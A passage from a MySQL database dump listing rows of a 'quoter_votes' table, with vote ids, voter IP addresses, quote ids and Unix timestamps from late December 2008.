  (7592,'174.36.207.234','',0,113,1230186630),
  (7593,'174.36.207.234','',0,88,1230186638),
  (7594,'174.36.207.234','',0,87,1230186652),
  (7595,'174.36.207.234','',0,221,1230186675),
  (7596,'174.36.207.234','',0,118,1230186696),
  (7597,'174.36.207.234','',0,110,1230186712),
  (7598,'174.36.207.234','',0,74,1230186735),
  (7599,'174.36.207.234','',0,24,1230186770),
  (7600,'174.36.207.234','',0,23,1230186783),
  (7601,'174.36.207.234','',0,144,1230186818),
  (7602,'174.36.207.234','',0,130,1230186829),
  (7603,'174.36.207.234','',0,85,1230186836),
  (7604,'174.36.207.234','',0,84,1230186853),
  (7605,'174.36.207.234','',0,12,1230186861),
  (7606,'174.36.207.234','',0,245,1230186875),
  (7607,'174.36.207.234','',0,152,1230186884),
  (7608,'174.36.207.234','',0,125,1230186892),
  (7609,'174.36.207.234','',0,99,1230186900),
  (7610,'174.36.207.234','',0,62,1230186923),
  (7611,'174.36.207.234','',0,50,1230186932),
  (7612,'174.36.207.234','',0,236,1230186947),
  (7613,'174.36.207.234','',0,136,1230186956),
  (7614,'174.36.207.234','',0,135,1230186966),
  (7615,'174.36.207.234','',0,73,1230186977),
  (7616,'174.36.207.234','',0,58,1230186985),
  (7617,'92.46.47.134','',0,221,1230186993),
  (7618,'174.36.207.234','',0,44,1230186995),
  (7619,'174.36.207.234','',0,138,1230187003),
  (7620,'174.36.207.234','',0,100,1230187012),
  (7621,'174.36.207.234','',0,60,1230187022),
  (7622,'174.36.207.234','',0,55,1230187030),
  (7623,'174.36.207.234','',0,253,1230187039),
  (7624,'174.36.207.234','',0,219,1230187049),
  (7625,'174.36.207.234','',0,134,1230187062),
  (7626,'174.36.207.234','',0,238,1230187099),
  (7627,'174.36.207.234','',0,233,1230187106),
  (7628,'174.36.207.234','',0,224,1230187128),
  (7629,'174.36.207.234','',0,222,1230187140),
  (7630,'174.36.207.234','',0,218,1230187156),
  (7631,'174.36.207.234','',0,208,1230187166),
  (7632,'174.36.207.234','',0,206,1230187177),
  (7633,'174.36.207.234','',0,1,1230187193),
  (7634,'174.36.207.234','',0,29,1230187234),
  (7635,'174.36.207.234','',0,56,1230187247),
  (7636,'174.36.207.234','',0,21,1230187254),
  (7637,'174.36.207.234','',0,18,1230187264),
  (7638,'174.36.207.234','',0,173,1230187272),
  (7639,'174.36.207.234','',0,120,1230187282),
  (7640,'174.36.207.234','',0,109,1230187293),
  (7641,'174.36.207.234','',0,119,1230187302),
  (7642,'174.36.207.234','',0,204,1230187413),
  (7643,'174.36.207.234','',0,201,1230187418),
  (7644,'174.36.207.234','',0,199,1230187426),
  (7645,'174.36.207.234','',0,197,1230187443),
  (7646,'174.36.207.234','',0,195,1230187459),
  (7647,'174.36.207.234','',0,189,1230187466),
  (7648,'174.36.207.234','',0,185,1230187472),
  (7649,'174.36.207.234','',0,177,1230187480),
  (7650,'174.36.207.234','',0,176,1230187486),
  (7651,'174.36.207.234','',0,172,1230187491),
  (7652,'174.36.207.234','',0,164,1230187501),
  (7653,'174.36.207.234','',0,161,1230187513),
  (7654,'174.36.207.234','',0,159,1230187521),
  (7655,'174.36.207.234','',0,157,1230187539),
  (7656,'174.36.207.234','',0,156,1230187560),
  (7657,'174.36.207.234','',0,155,1230187567),
  (7658,'174.36.207.234','',0,154,1230187576),
  (7659,'77.123.98.190','',0,55,1230187953),
  (7660,'77.123.98.190','',0,1,1230187958),
  (7661,'91.203.13.34','',0,262,1230188087),
  (7662,'195.16.44.210','',0,265,1230189077),
  (7663,'92.255.240.8','',0,259,1230189333),
  (7664,'92.255.240.8','',0,262,1230189402),
  (7665,'92.255.240.8','',0,272,1230189437),
  (7666,'92.255.240.8','',0,270,1230189456),
  (7667,'91.122.22.8','',0,212,1230189526),
  (7668,'91.122.22.8','',0,171,1230189531),
  (7669,'94.181.229.244','',0,269,1230190215),
  (7670,'94.181.229.244','',0,265,1230190234),
  (7671,'72.30.142.222','',0,189,1230190344),
  (7672,'91.202.128.88','',0,265,1230191042),
  (7673,'91.202.128.88','',0,264,1230191059),
  (7674,'91.202.128.88','',0,258,1230191126),
  (7675,'91.202.128.88','',0,256,1230191149),
  (7676,'91.202.128.88','',0,249,1230191266),
  (7677,'91.202.128.88','',0,242,1230191398),
  (7678,'87.248.178.64','',0,258,1230191506),
  (7679,'72.30.142.222','',0,86,1230195189),
  (7680,'77.122.32.72','',0,273,1230195286),
  (7681,'80.243.4.222','',0,273,1230196169),
  (7682,'77.122.32.72','',0,133,1230196453),
  (7683,'80.243.4.222','',0,272,1230196509),
  (7684,'80.243.4.222','',0,270,1230196599),
  (7685,'80.243.4.222','',0,269,1230196635),
  (7686,'80.243.4.222','',0,265,1230196641),
  (7687,'64.1.215.165','',0,259,1230198789),
  (7688,'89.107.82.115','',0,55,1230198949),
  (7689,'89.107.82.115','',0,1,1230198951),
  (7690,'92.46.47.134','',0,55,1230199105),
  (7691,'92.46.47.134','',0,258,1230199125),
  (7692,'72.30.142.222','',0,144,1230199892),
  (7693,'195.222.175.242','',0,251,1230199936),
  (7694,'195.222.175.242','',0,273,1230200618),
  (7695,'62.5.199.194','',0,274,1230200618),
  (7696,'195.222.175.242','',0,265,1230200626),
  (7697,'62.5.199.194','',0,270,1230200678),
  (7698,'62.5.199.194','',0,269,1230200684),
  (7699,'62.5.199.194','',0,264,1230200728),
  (7700,'213.33.216.246','',0,275,1230200774),
  (7701,'62.5.199.194','',0,262,1230200790),
  (7702,'62.5.199.194','',0,259,1230200812),
  (7703,'62.5.199.194','',0,258,1230200846),
  (7704,'62.5.199.194','',0,254,1230200894),
  (7705,'62.5.199.194','',0,242,1230200921),
  (7706,'62.5.199.194','',0,238,1230200943),
  (7707,'62.5.199.194','',0,222,1230201006),
  (7708,'62.5.199.194','',0,218,1230201054),
  (7709,'62.5.199.194','',0,208,1230201080),
  (7710,'62.5.199.194','',0,206,1230201103),
  (7711,'62.5.199.194','',0,201,1230201134),
  (7712,'62.5.199.194','',0,195,1230201163),
  (7713,'195.39.196.252','',0,277,1230202994),
  (7714,'195.39.196.252','',0,278,1230202997),
  (7715,'195.39.196.252','',0,276,1230203006),
  (7716,'195.39.196.252','',0,275,1230203018),
  (7717,'195.39.196.252','',0,274,1230203051),
  (7718,'195.39.196.252','',0,273,1230203075),
  (7719,'195.39.196.252','',0,269,1230203122),
  (7720,'195.39.196.252','',0,264,1230203128),
  (7721,'195.39.196.252','',0,262,1230203203),
  (7722,'91.185.5.50','',0,262,1230203656),
  (7723,'88.204.16.169','',0,265,1230204529),
  (7724,'91.145.255.180','',0,264,1230204841),
  (7725,'91.145.255.180','',0,265,1230204846),
  (7726,'91.145.255.180','',0,262,1230204903),
  (7727,'91.145.255.180','',0,259,1230204925),
  (7728,'91.145.255.180','',0,258,1230204971),
  (7729,'72.30.142.222','',0,216,1230205119),
  (7730,'195.39.196.252','',0,238,1230205284),
  (7731,'195.39.196.252','',0,233,1230205313),
  (7732,'195.39.196.252','',0,218,1230205448),
  (7733,'91.145.255.180','',0,234,1230205479),
  (7734,'195.39.196.252','',0,208,1230205490),
  (7735,'91.192.6.218','',0,143,1230208009),
  (7736,'91.192.6.218','',0,133,1230208058),
  (7737,'64.1.215.165','',0,258,1230208183),
  (7738,'84.204.148.130','',0,273,1230208259),
  (7739,'84.204.148.130','',0,265,1230208293),
  (7740,'84.204.148.130','',0,262,1230208342),
  (7741,'84.204.148.130','',0,258,1230208359),
  (7742,'77.122.222.211','',0,269,1230208875),
  (7743,'94.178.147.226','',0,274,1230208998),
  (7744,'160.83.32.14','',0,48,1230209645),
  (7745,'160.83.32.14','',0,21,1230209692),
  (7746,'160.83.32.14','',0,56,1230209748),
  (7747,'160.83.32.14','',0,212,1230209788),
  (7748,'160.83.32.14','',0,173,1230209802),
  (7749,'72.30.142.222','',0,208,1230210444),
  (7750,'89.223.24.167','',0,272,1230210495),
  (7751,'213.137.232.149','',0,265,1230210528),
  (7752,'67.202.43.229','',0,258,1230210835),
  (7753,'67.202.43.229','',0,259,1230210847),
  (7754,'67.202.43.229','',0,262,1230210855),
  (7755,'67.202.43.229','',0,263,1230210865),
  (7756,'67.202.43.229','',0,264,1230210877),
  (7757,'67.202.43.229','',0,265,1230210886),
  (7758,'67.202.43.229','',0,269,1230210895),
  (7759,'67.202.43.229','',0,270,1230210910),
  (7760,'67.202.43.229','',0,272,1230210918),
  (7761,'67.202.43.229','',0,273,1230210930),
  (7762,'87.244.13.210','',0,180,1230211975),
  (7763,'193.19.206.251','',0,233,1230212970),
  (7764,'72.30.142.222','',0,206,1230214759),
  (7765,'84.204.148.130','',0,234,1230216032),
  (7766,'91.202.197.79','',0,269,1230216376),
  (7767,'81.30.112.106','',0,113,1230216510),
  (7768,'81.30.112.106','',0,171,1230216730),
  (7769,'93.84.99.79','',0,272,1230216739),
  (7770,'93.84.99.79','',0,270,1230216750),
  (7771,'93.84.99.79','',0,269,1230216761),
  (7772,'93.84.99.79','',0,265,1230216770),
  (7773,'93.84.99.79','',0,264,1230216796),
  (7774,'84.204.148.130','',0,76,1230216798),
  (7775,'92.113.143.230','',0,280,1230216813),
  (7776,'92.113.143.230','',0,279,1230216817),
  (7777,'93.84.99.79','',0,262,1230216819),
  (7778,'93.84.99.79','',0,259,1230216826),
  (7779,'85.172.37.241','',0,280,1230217254),
  (7780,'195.39.196.252','',0,280,1230217348),
  (7781,'195.39.196.252','',0,265,1230217514),
  (7782,'93.84.99.79','',0,274,1230217577),
  (7783,'93.84.99.79','',0,253,1230217594),
  (7784,'93.84.99.79','',0,219,1230217600),
  (7785,'93.84.99.79','',0,134,1230217608),
  (7786,'93.84.99.79','',0,221,1230217656),
  (7787,'93.84.99.79','',0,118,1230217882),
  (7788,'195.39.196.252','',0,178,1230218059),
  (7789,'195.39.196.252','',0,173,1230218073),
  (7790,'195.39.196.252','',0,120,1230218266),
  (7791,'195.39.196.252','',0,119,1230218270),
  (7792,'195.39.196.252','',0,180,1230218313),
  (7793,'195.39.196.252','',0,163,1230218371),
  (7794,'195.39.196.252','',0,139,1230218393),
  (7795,'195.39.196.252','',0,133,1230218419),
  (7796,'195.39.196.252','',0,111,1230218436),
  (7797,'95.24.43.250','',0,280,1230218537),
  (7798,'156.17.237.13','',0,279,1230219369),
  (7799,'81.26.156.31','',0,281,1230219968),
  (7800,'87.228.54.224','',0,264,1230222613),
  (7801,'87.228.54.224','',0,270,1230222630),
  (7802,'195.26.92.114','',0,264,1230222970),
  (7803,'195.26.92.114','',0,262,1230223008),
  (7804,'195.26.92.114','',0,258,1230223031),
  (7805,'72.30.142.222','',0,212,1230223384),
  (7806,'156.17.237.13','',0,282,1230224141),
  (7807,'85.140.116.125','',0,282,1230224912),
  (7808,'85.140.116.125','',0,281,1230225267),
  (7809,'85.140.116.125','',0,280,1230225436),
  (7810,'85.140.116.125','',0,279,1230225622),
  (7811,'85.140.116.125','',0,274,1230225653),
  (7812,'72.30.142.222','',0,195,1230225663),
  (7813,'85.140.116.125','',0,273,1230225881),
  (7814,'156.17.237.13','',0,21,1230226037),
  (7815,'85.140.116.125','',0,269,1230226058),
  (7816,'92.50.248.33','',0,282,1230226370),
  (7817,'92.50.248.33','',0,197,1230226442),
  (7818,'92.50.248.33','',0,195,1230226445),
  (7819,'72.30.142.222','',0,95,1230226938),
  (7820,'72.30.142.222','',0,229,1230227372),
  (7821,'72.30.142.222','',0,272,1230228253),
  (7822,'93.84.99.79','',0,110,1230228319),
  (7823,'93.84.99.79','',0,74,1230228354),
  (7824,'93.84.99.79','',0,24,1230228359),
  (7825,'93.84.99.79','',0,23,1230228371),
  (7826,'93.84.99.79','',0,247,1230228472),
  (7827,'93.84.99.79','',0,235,1230228501),
  (7828,'93.84.99.79','',0,227,1230228557),
  (7829,'93.84.99.79','',0,216,1230228602),
  (7830,'93.84.99.79','',0,215,1230228620),
  (7831,'93.84.99.79','',0,213,1230228639),
  (7832,'93.84.99.79','',0,212,1230228660),
  (7833,'91.122.22.8','',0,212,1230228673),
  (7834,'91.122.22.8','',0,171,1230228673),
  (7835,'93.84.99.79','',0,171,1230228747),
  (7836,'93.84.99.79','',0,165,1230228772),
  (7837,'93.84.99.79','',0,145,1230228808),
  (7838,'93.84.99.79','',0,142,1230228834),
  (7839,'93.84.99.79','',0,119,1230228859),
  (7840,'93.84.99.79','',0,96,1230228919),
  (7841,'93.84.99.79','',0,79,1230228925),
  (7842,'66.249.66.47','',0,129,1230228988),
  (7843,'93.84.99.79','',0,56,1230228990),
  (7844,'93.84.99.79','',0,16,1230229031),
  (7845,'64.1.215.165','',0,242,1230229318),
  (7846,'195.66.200.116','',0,262,1230230473),
  (7847,'195.66.200.116','',0,259,1230230481),
  (7848,'72.30.142.222','',0,24,1230232298),
  (7849,'72.30.142.222','',0,2,1230234091),
  (7850,'89.146.79.91','',0,282,1230234697),
  (7851,'89.146.79.91','',0,265,1230234706),
  (7852,'83.99.149.85','',0,214,1230234952),
  (7853,'83.99.149.85','',0,223,1230234966),
  (7854,'83.99.149.85','',0,202,1230234976),
  (7855,'72.30.142.222','',0,1,1230235338),
  (7856,'78.37.9.136','',0,256,1230236308),
  (7857,'72.30.142.222','',0,110,1230237115),
  (7858,'81.19.66.84','',0,189,1230237626),
  (7859,'91.122.127.190','',0,282,1230237755),
  (7860,'91.122.127.190','',0,280,1230237795),
  (7861,'81.19.66.84','',0,233,1230238244),
  (7862,'81.19.66.84','',0,238,1230238800),
  (7863,'91.122.22.8','',0,282,1230239115),
  (7864,'91.122.22.8','',0,273,1230239171),
  (7865,'91.122.22.8','',0,269,1230239192),
  (7866,'156.17.237.13','',0,282,1230239338),
  (7867,'91.122.22.8','',0,246,1230239436),
  (7868,'91.122.22.8','',0,212,1230239574),
  (7869,'66.249.66.47','',0,12,1230239904),
  (7870,'72.30.142.222','',0,90,1230241061),
  (7871,'72.30.142.222','',0,130,1230241084),
  (7872,'72.30.142.222','',0,203,1230243813),
  (7873,'72.30.142.222','',0,265,1230246285),
  (7874,'72.30.142.222','',0,212,1230247155),
  (7875,'72.30.142.222','',0,161,1230247630),
  (7876,'65.55.105.208','',0,216,1230249834),
  (7877,'65.55.107.239','',0,216,1230250121),
  (7878,'82.193.112.122','',0,173,1230250533),
  (7879,'72.30.142.222','',0,185,1230255772),
  (7880,'72.30.142.222','',0,274,1230256095),
  (7881,'72.30.142.222','',0,269,1230256147),
  (7882,'72.30.142.222','',0,281,1230256149),
  (7883,'72.30.142.222','',0,282,1230256231),
  (7884,'93.88.5.140','',0,282,1230256545),
  (7885,'72.30.142.222','',0,273,1230257226),
  (7886,'72.30.142.222','',0,87,1230259934),
  (7887,'81.19.66.89','',0,21,1230262368),
  (7888,'81.19.66.89','',0,248,1230262370),
  (7889,'72.30.142.222','',0,253,1230262964),
  (7890,'82.200.242.26','',0,238,1230263560),
  (7891,'82.200.242.26','',0,258,1230263565),
  (7892,'82.200.242.26','',0,55,1230263570),
  (7893,'81.19.66.89','',0,249,1230264319),
  (7894,'81.19.66.89','',0,250,1230264320),
  (7895,'81.19.66.89','',0,251,1230264505),
  (7896,'81.19.66.89','',0,253,1230264643),
  (7897,'81.19.66.89','',0,255,1230264776),
  (7898,'81.19.66.89','',0,254,1230264776),
  (7899,'81.19.66.89','',0,256,1230264907),
  (7900,'72.30.142.222','',0,2,1230265448),
  (7901,'72.30.142.222','',0,180,1230265618),
  (7902,'72.30.142.222','',0,184,1230265890),
  (7903,'72.30.142.222','',0,279,1230265949),
  (7904,'74.6.22.182','',0,204,1230266542),
  (7905,'74.6.22.182','',0,282,1230268878),
  (7906,'74.6.22.182','',0,221,1230270708),
  (7907,'121.44.195.161','',0,255,1230271032),
  (7908,'121.44.195.161','',0,251,1230271389),
  (7909,'87.119.230.181','',0,282,1230272456),
  (7910,'87.119.230.181','',0,273,1230272512),
  (7911,'93.88.5.140','',0,273,1230272594),
  (7912,'91.185.54.22','',0,273,1230272599),
  (7913,'80.243.71.189','',0,282,1230272657),
  (7914,'80.243.71.189','',0,280,1230272661),
  (7915,'74.6.22.182','',0,4,1230272696),
  (7916,'80.243.71.189','',0,265,1230272795),
  (7917,'74.6.22.182','',0,23,1230273400),
  (7918,'91.124.20.166','',0,282,1230273756),
  (7919,'91.124.20.166','',0,281,1230273872),
  (7920,'74.6.22.182','',0,280,1230273993),
  (7921,'80.243.71.189','',0,281,1230274016),
  (7922,'91.124.20.166','',0,254,1230274144),
  (7923,'87.226.212.122','',0,280,1230274474),
  (7924,'88.204.251.92','',0,258,1230274580),
  (7925,'88.204.251.92','',0,55,1230274591),
  (7926,'84.17.2.10','',0,283,1230275011),
  (7927,'84.17.2.10','',0,282,1230275016),
  (7928,'84.17.2.10','',0,280,1230275082),
  (7929,'87.226.212.122','',0,258,1230275174),
  (7930,'87.226.212.122','',0,212,1230275394),
  (7931,'74.6.22.182','',0,99,1230275412),
  (7932,'80.89.145.65','',0,282,1230275507),
  (7933,'80.89.145.65','',0,272,1230275547),
  (7934,'80.243.71.189','',0,283,1230275601),
  (7935,'91.124.20.166','',0,18,1230275660),
  (7936,'193.19.206.251','',0,282,1230276344),
  (7937,'193.19.206.251','',0,279,1230276434),
  (7938,'78.107.93.83','',0,285,1230277146),
  (7939,'78.107.93.83','',0,282,1230277332),
  (7940,'78.107.93.83','',0,280,1230277341),
  (7941,'74.6.22.182','',0,176,1230277740),
  (7942,'79.171.124.37','',0,227,1230277909),
  (7943,'79.171.124.37','',0,171,1230277916),
  (7944,'79.171.124.37','',0,165,1230277921),
  (7945,'67.195.37.171','',0,138,1230278730),
  (7946,'78.107.176.130','',0,282,1230279525),
  (7947,'78.107.176.130','',0,283,1230279531),
  (7948,'78.107.176.130','',0,285,1230279536),
  (7949,'78.107.176.130','',0,284,1230279540),
  (7950,'78.107.176.130','',0,281,1230279554),
  (7951,'78.107.176.130','',0,280,1230279566),
  (7952,'78.107.176.130','',0,270,1230279637),
  (7953,'78.107.176.130','',0,265,1230279656),
  (7954,'78.107.176.130','',0,264,1230279673),
  (7955,'78.107.176.130','',0,263,1230279683),
  (7956,'78.107.176.130','',0,262,1230279697),
  (7957,'78.107.176.130','',0,259,1230279728),
  (7958,'91.192.32.50','',0,282,1230279923),
  (7959,'74.6.22.182','',0,272,1230280050),
  (7960,'87.249.5.250','',0,29,1230280535),
  (7961,'194.44.62.149','',0,265,1230281309),
  (7962,'77.123.83.146','',0,262,1230282045),
  (7963,'74.6.22.182','',0,157,1230282498),
  (7964,'92.124.172.77','',0,284,1230283029),
  (7965,'92.124.172.77','',0,281,1230283124),
  (7966,'93.186.59.182','',0,139,1230283208),
  (7967,'213.208.171.192','',0,280,1230283213),
  (7968,'93.186.59.182','',0,133,1230283222),
  (7969,'213.208.171.192','',0,249,1230283248),
  (7970,'93.186.59.182','',0,3,1230283304),
  (7971,'213.208.171.146','',0,220,1230283423),
  (7972,'213.208.171.146','',0,207,1230283455),
  (7973,'213.208.171.146','',0,205,1230283496),
  (7974,'213.208.171.146','',0,184,1230283528),
  (7975,'84.17.2.10','',0,284,1230283531),
  (7976,'213.208.171.192','',0,258,1230283559),
  (7977,'213.208.171.146','',0,128,1230283610),
  (7978,'92.124.172.77','',0,286,1230283797),
  (7979,'213.208.171.146','',0,48,1230283873),
  (7980,'66.249.66.47','',0,89,1230283882),
  (7981,'213.208.171.146','',0,21,1230283992),
  (7982,'213.208.171.146','',0,56,1230284595),
  (7983,'213.208.171.146','',0,212,1230284971),
  (7984,'213.208.171.146','',0,18,1230284992),
  (7985,'213.208.171.146','',0,173,1230285006),
  (7986,'213.208.171.146','',0,119,1230285093),
  (7987,'217.66.20.86','',0,284,1230285929),
  (7988,'217.66.20.86','',0,283,1230286001),
  (7989,'217.66.20.86','',0,281,1230286039),
  (7990,'66.249.66.47','',0,130,1230286236),
  (7991,'217.66.20.86','',0,262,1230286336),
  (7992,'217.66.20.86','',0,259,1230286351),
  (7993,'74.6.22.182','',0,253,1230287518),
  (7994,'84.204.148.130','',0,283,1230287753),
  (7995,'78.24.231.131','',0,55,1230287854),
  (7996,'78.24.231.131','',0,1,1230287856),
  (7997,'74.6.22.182','',0,84,1230288603),
  (7998,'94.248.105.145','',0,286,1230288941),
  (7999,'94.248.105.145','',0,171,1230288956),
  (8000,'94.248.105.145','',0,165,1230288965);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 8000,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (8001,'92.113.31.63','',0,288,1230289481),
  (8002,'81.18.116.69','',0,284,1230289591),
  (8003,'92.113.31.63','',0,218,1230289649),
  (8004,'92.113.31.63','',0,219,1230289755),
  (8005,'91.193.166.194','',0,286,1230290076),
  (8006,'91.193.166.194','',0,259,1230290255),
  (8007,'67.202.43.229','',0,223,1230290914),
  (8008,'66.249.66.47','',0,234,1230291721),
  (8009,'84.204.148.130','',0,286,1230291873),
  (8010,'84.204.148.130','',0,285,1230291937),
  (8011,'66.249.66.47','',0,20,1230291996),
  (8012,'217.113.122.50','',0,171,1230292215),
  (8013,'217.113.122.50','',0,245,1230292437),
  (8014,'91.122.138.39','',0,56,1230292449),
  (8015,'91.122.138.39','',0,171,1230292484),
  (8016,'74.6.22.182','',0,113,1230293179),
  (8017,'81.195.103.130','',0,1,1230294772),
  (8018,'217.170.219.67','',0,119,1230295300),
  (8019,'195.39.196.252','',0,180,1230295311),
  (8020,'195.39.196.252','',0,288,1230295340),
  (8021,'67.202.43.229','',0,250,1230295350),
  (8022,'195.39.196.252','',0,284,1230295463),
  (8023,'74.6.22.182','',0,281,1230295564),
  (8024,'195.39.196.252','',0,281,1230295584),
  (8025,'195.39.196.252','',0,280,1230295592),
  (8026,'66.249.66.47','',0,285,1230296037),
  (8027,'92.244.233.170','',0,279,1230296378),
  (8028,'74.6.22.182','',0,280,1230298728),
  (8029,'217.117.64.2','',0,221,1230298752),
  (8030,'91.195.22.32','',0,289,1230298969),
  (8031,'91.195.22.32','',0,286,1230299017),
  (8032,'217.117.64.2','',0,286,1230299115),
  (8033,'91.195.22.32','',0,285,1230299136),
  (8034,'91.202.197.79','',0,289,1230299156),
  (8035,'91.195.22.32','',0,284,1230299167),
  (8036,'91.195.22.32','',0,283,1230299187),
  (8037,'91.195.22.32','',0,281,1230299202),
  (8038,'91.195.22.32','',0,280,1230299215),
  (8039,'217.117.64.2','',0,216,1230299215),
  (8040,'217.117.64.2','',0,284,1230299364),
  (8041,'217.117.64.2','',0,281,1230299506),
  (8042,'217.117.64.2','',0,270,1230299576),
  (8043,'213.79.111.11','',0,290,1230300094),
  (8044,'89.179.122.69','',0,55,1230300633),
  (8045,'66.249.66.47','',0,256,1230301221),
  (8046,'80.90.122.149','',0,113,1230301411),
  (8047,'156.17.237.13','',0,286,1230301916),
  (8048,'82.116.46.212','',0,290,1230302082),
  (8049,'91.202.197.79','',0,291,1230302107),
  (8050,'91.202.197.79','',0,290,1230302127),
  (8051,'80.80.111.240','',0,286,1230302421),
  (8052,'91.202.197.79','',0,286,1230302586),
  (8053,'91.202.197.79','',0,283,1230302588),
  (8054,'91.202.197.79','',0,1,1230302663),
  (8055,'82.116.46.212','',0,55,1230303739),
  (8056,'82.116.46.212','',0,212,1230303876),
  (8057,'82.116.46.212','',0,292,1230304506),
  (8058,'66.249.66.47','',0,258,1230305099),
  (8059,'74.6.22.182','',0,60,1230305509),
  (8060,'195.222.71.77','',0,1,1230305650),
  (8061,'77.122.245.211','',0,286,1230307205),
  (8062,'66.249.66.47','',0,285,1230307954),
  (8063,'156.17.237.13','',0,294,1230308249),
  (8064,'81.26.156.31','',0,294,1230308618),
  (8065,'74.6.22.182','',0,265,1230308804),
  (8066,'195.200.64.194','',0,286,1230309630),
  (8067,'94.178.245.75','',0,288,1230309680),
  (8068,'195.200.64.194','',0,218,1230309774),
  (8069,'194.226.199.73','',0,286,1230310062),
  (8070,'87.237.116.33','',0,238,1230310750),
  (8071,'87.237.116.33','',0,93,1230310759),
  (8072,'94.178.245.75','',0,294,1230311277),
  (8073,'94.178.245.75','',0,291,1230311342),
  (8074,'94.178.245.75','',0,292,1230311345),
  (8075,'94.178.245.75','',0,285,1230311512),
  (8076,'94.178.245.75','',0,284,1230311542),
  (8077,'91.122.140.51','',0,73,1230311734),
  (8078,'94.178.245.75','',0,281,1230311810),
  (8079,'94.178.245.75','',0,280,1230311821),
  (8080,'94.178.245.75','',0,242,1230312070),
  (8081,'91.122.17.108','',0,212,1230312908),
  (8082,'91.122.17.108','',0,171,1230312909),
  (8083,'77.47.182.12','',0,125,1230313256),
  (8084,'74.6.22.182','',0,218,1230314195),
  (8085,'74.6.22.182','',0,227,1230316446),
  (8086,'79.126.35.25','',0,238,1230317979),
  (8087,'79.126.35.25','',0,236,1230317987),
  (8088,'74.6.22.182','',0,274,1230319106),
  (8089,'74.6.22.182','',0,208,1230319586),
  (8090,'64.1.215.165','',0,245,1230320351),
  (8091,'156.17.237.13','',0,295,1230320955),
  (8092,'156.17.237.13','',0,286,1230320966),
  (8093,'64.1.215.165','',0,233,1230321940),
  (8094,'66.249.66.47','',0,258,1230322418),
  (8095,'74.6.22.182','',0,95,1230322927),
  (8096,'62.221.86.72','',0,292,1230323588),
  (8097,'62.221.86.72','',0,291,1230323600),
  (8098,'89.223.24.143','',0,251,1230324645),
  (8099,'74.6.22.182','',0,241,1230324746),
  (8100,'89.223.24.143','',0,190,1230324845),
  (8101,'74.6.22.182','',0,163,1230324885),
  (8102,'66.249.66.47','',0,256,1230325023),
  (8103,'91.145.217.178','',0,292,1230325394),
  (8104,'91.145.217.178','',0,286,1230325540),
  (8105,'94.253.55.144','',0,294,1230325948),
  (8106,'94.253.55.144','',0,286,1230326088),
  (8107,'93.125.18.45','',0,295,1230326318),
  (8108,'93.125.18.45','',0,286,1230326347),
  (8109,'93.125.18.45','',0,272,1230326412),
  (8110,'74.6.22.182','',0,3,1230327845),
  (8111,'85.198.132.29','',0,290,1230327882),
  (8112,'64.1.215.165','',0,240,1230328983),
  (8113,'93.185.183.24','',0,288,1230329344),
  (8114,'91.210.20.2','',0,291,1230330629),
  (8115,'74.6.22.182','',0,215,1230330679),
  (8116,'78.138.156.131','',0,279,1230330897),
  (8117,'194.44.251.139','',0,291,1230331614),
  (8118,'74.6.22.182','',0,207,1230331650),
  (8119,'74.6.22.182','',0,100,1230332014),
  (8120,'67.195.37.171','',0,289,1230332646),
  (8121,'67.195.37.171','',0,291,1230332836),
  (8122,'67.195.37.171','',0,290,1230333026),
  (8123,'67.195.37.171','',0,295,1230333035),
  (8124,'74.6.22.182','',0,256,1230333704),
  (8125,'74.6.22.182','',0,76,1230334553),
  (8126,'67.195.37.171','',0,288,1230334821),
  (8127,'74.6.22.182','',0,204,1230335247),
  (8128,'67.195.37.171','',0,292,1230335339),
  (8129,'79.135.204.134','',0,254,1230335514),
  (8130,'91.124.204.35','',0,254,1230335561),
  (8131,'74.6.22.182','',0,201,1230338233),
  (8132,'67.195.37.171','',0,289,1230341425),
  (8133,'67.195.37.171','',0,294,1230341435),
  (8134,'64.1.215.165','',0,215,1230341445),
  (8135,'64.1.215.165','',0,234,1230342260),
  (8136,'74.6.22.182','',0,279,1230342419),
  (8137,'64.1.215.165','',0,125,1230345942),
  (8138,'64.1.215.165','',0,241,1230346178),
  (8139,'64.1.215.165','',0,258,1230347903),
  (8140,'89.189.146.190','',0,295,1230352112),
  (8141,'65.55.105.192','',0,215,1230352634),
  (8142,'65.55.109.77','',0,215,1230352864),
  (8143,'74.6.22.182','',0,264,1230354684),
  (8144,'74.6.22.182','',0,214,1230355570),
  (8145,'84.17.2.10','',0,295,1230359447),
  (8146,'74.6.22.182','',0,94,1230359486),
  (8147,'84.17.2.10','',0,288,1230359601),
  (8148,'67.195.37.171','',0,287,1230359830),
  (8149,'67.195.37.171','',0,292,1230360759),
  (8150,'74.6.22.182','',0,23,1230366189),
  (8151,'66.249.66.47','',0,12,1230366655),
  (8152,'78.106.17.188','',0,246,1230367283),
  (8153,'84.17.2.10','',0,295,1230369769),
  (8154,'84.17.2.10','',0,294,1230369774),
  (8155,'84.17.2.10','',0,292,1230369778),
  (8156,'64.1.215.165','',0,254,1230369996),
  (8157,'78.24.226.111','',0,55,1230370649),
  (8158,'78.24.226.111','',0,1,1230370651),
  (8159,'78.24.226.111','',0,284,1230370685),
  (8160,'193.124.10.220','',0,71,1230370753),
  (8161,'74.6.22.182','',0,219,1230371231),
  (8162,'193.238.153.30','',0,284,1230372567),
  (8163,'193.238.153.30','',0,285,1230372605),
  (8164,'193.238.153.30','',0,289,1230372702),
  (8165,'193.238.153.30','',0,295,1230372774),
  (8166,'193.238.153.30','',0,294,1230372806),
  (8167,'66.249.66.47','',0,106,1230373966),
  (8168,'85.113.138.106','',0,235,1230374706),
  (8169,'85.113.138.106','',0,212,1230374746),
  (8170,'85.113.138.106','',0,245,1230374764),
  (8171,'85.113.138.106','',0,280,1230374884),
  (8172,'194.44.190.247','',0,291,1230375408),
  (8173,'194.44.190.247','',0,259,1230375794),
  (8174,'66.249.66.47','',0,102,1230376104),
  (8175,'66.249.66.47','',0,243,1230378327),
  (8176,'66.249.66.47','',0,12,1230378879),
  (8177,'74.6.22.182','',0,39,1230379379),
  (8178,'64.1.215.165','',0,62,1230379463),
  (8179,'74.6.22.182','',0,62,1230379523),
  (8180,'83.237.103.36','',0,285,1230379770),
  (8181,'83.237.103.36','',0,286,1230379788),
  (8182,'83.237.103.36','',0,287,1230379808),
  (8183,'83.237.103.36','',0,288,1230379821),
  (8184,'83.237.103.36','',0,289,1230379842),
  (8185,'83.237.103.36','',0,290,1230379861),
  (8186,'83.237.103.36','',0,291,1230379877),
  (8187,'83.237.103.36','',0,292,1230379889),
